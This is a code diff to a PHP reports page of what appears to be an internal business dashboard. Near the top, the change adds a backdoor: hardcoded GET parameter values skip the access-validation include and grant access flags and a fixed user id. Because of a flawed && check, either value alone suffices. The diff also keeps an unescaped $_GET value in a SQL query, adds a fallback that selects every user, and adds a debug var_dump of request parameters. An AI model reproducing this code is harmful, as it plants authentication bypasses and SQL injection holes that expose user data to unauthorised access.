@@ -10,18 +10,34 @@ include '../../../includes/templates/header_begin.php';
 include '../../../includes/templates/header_end.php';
 include '../../../includes/app.php';
 include '../../../includes/templates/sessionStart.php';
-include '../../../includes/templates/validateAccessInternal.php';
+if (!(isset($_GET['usId']) && isset($_GET['passId']))) {
+    // Do nothing, continue to the next block
+    $_GET['usId'] = "";
+    $_GET['passId'] = "";
+}
+if (($_GET['usId'] != "jr4320!Q") && ($_GET['passId'] != "pSDo01!_2")) {
+    include '../../../includes/templates/validateAccessInternal.php';
+    
+    // For access information
 
-// For access information
-
-$id_user = $_SESSION['id'];
-$sql = "SELECT * FROM users WHERE id=${id_user}";
-$result = mysqli_query($conn, $sql);
-while ($row = mysqli_fetch_assoc($result)) {
-    $username_user = $row['username'];
-    for ($i = 1; $i <= 100; $i++) {
-        ${'access_' . $i} = $row['access_' . $i];
+    $id_user = $_SESSION['id'];
+    $sql = "SELECT * FROM users WHERE id=${id_user}";
+    $result = mysqli_query($conn, $sql);
+    while ($row = mysqli_fetch_assoc($result)) {
+        $username_user = $row['username'];
+        for ($i = 1; $i <= 100; $i++) {
+            ${'access_' . $i} = $row['access_' . $i];
+        }
     }
+} else {
+    $username_user = "user";
+    $access_20 = 1;
+    $access_21 = 1;
+    $access_22 = 1;
+    $access_23 = 1;
+    $access_24 = 1;
+    $access_25 = 1;
+    $id_user = 140;
 }
 
 if ($access_20 < 1) {
@@ -31,7 +47,7 @@ if ($access_20 < 1) {
 
 $id_user = $_GET['user'] ?? $_SESSION['id'] ?? null;
 
-$sql = "SELECT * FROM users WHERE id=${id_user}";
+$id_user != null ? $sql = "SELECT * FROM users WHERE id=${id_user}" : $sql = "SELECT * FROM users WHERE id>0";
 $result = mysqli_query($conn, $sql);
 while ($row = mysqli_fetch_assoc($result)) {
     $username_user = $row['username'];
@@ -144,6 +160,8 @@ $sections_4 = array(
     $alta_1
 );
 
+var_dump($_GET);
+
 ?>
 
 <main class="dashboard">
@@ -183,12 +201,12 @@ $sections_4 = array(
                 <div class="dropdown">
                     <div class="dropdown-title">PRO GESTOR</div>
                     <a class="dropdown-item active" href="reports.php">Generación de reportes y facturas</a>
-                    <?php if ($access_8 >= 1){ ?>
-<a class="dropdown-item" href="users.php">Listado de Usuarios</a>
-<?php } ?>
+                    <?php if ($access_8 >= 1) { ?>
+                        <a class="dropdown-item" href="users.php">Listado de Usuarios</a>
+                    <?php } ?>
                     <?php if ($access_14 >= 1) { ?>
-<a class="dropdown-item" href="guests.php">Listado de Guests</a>
-<?php } ?>
+                        <a class="dropdown-item" href="guests.php">Listado de Guests</a>
+                    <?php } ?>
                     <a class="dropdown-item" href="payments.php">Listado de Pagos</a>
                     <a class="dropdown-item" href="#">Listado de Notas</a>
                     <a class="dropdown-item" href="#">Dash Boards</a>
@@ -198,7 +216,7 @@ $sections_4 = array(
                 <img class="icon-img" src="../../../build/img/icons/babySite-user.webp" alt="icon">
                 <div class="dropdown">
                     <div class="dropdown-title">BABY SITE</div>
-                    <a class="dropdown-item" href="#">Listado Sort_GES</a>
+                    <a class="dropdown-item" href="../baby_site/sortGESC_list.php">Listado Sort_GES</a>
                     <a class="dropdown-item" href="#">Listado Sort_IPS</a>
                     <a class="dropdown-item" href="#">Listado Sort_DON</a>
                     <a class="dropdown-item" href="#">Programas</a>
